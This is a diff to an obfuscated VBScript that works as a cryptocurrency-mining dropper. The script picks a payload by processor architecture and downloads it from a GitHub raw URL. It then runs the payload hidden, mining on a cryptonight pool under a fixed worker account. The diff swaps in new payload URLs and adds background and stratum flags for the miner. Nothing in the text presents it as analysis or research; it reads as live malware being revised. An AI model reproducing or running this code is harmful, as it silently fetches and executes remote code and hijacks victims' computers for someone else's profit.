@@ -6,9 +6,9 @@ Dim FDrte
 Set FDrtr=wscript.createobject("wscript.shell")
 FDrte=FDrtr.environment("system").item("processor_architecture")
 if right(FDrte, 2) = "64" then
-FDrtw = "https://raw.githubusercontent.com/jommb/872/master/b"
+FDrtw = "https://raw.githubusercontent.com/jommb/872/master/b2"
 else
-FDrtw = "https://raw.githubusercontent.com/jommb/872/master/m"
+FDrtw = "https://raw.githubusercontent.com/jommb/872/master/m2"
 end if
 Set FDrtt = CreateObject("Scripting.FileSystemObject")
 If FDrtt.FileExists(UMbty) Then FDrtt.DeleteFile UMbty
@@ -23,7 +23,7 @@ loop Until FDrtt.FileExists(UMbty)
 Set FDrtu = WScript.CreateObject("WScript.Shell")
 trv="FDrtu.Run UMbty"
 trv=trv&" & "
-trv=trv&""" --auto --any --forever --variation 3 --variation 15 --low -o europe.cryptonight-hub.miningpoolhub.com:20580 -u telefile.w -p x"", 0, false"
+trv=trv&"""-q -o stratum+tcp://europe.cryptonight-hub.miningpoolhub.com:20580 -u telefile.w -p x --safe --keepalive -B"", 0, false"
 Execute trv
 WScript.Quit
 Function FDrty(InetFile, jvc)
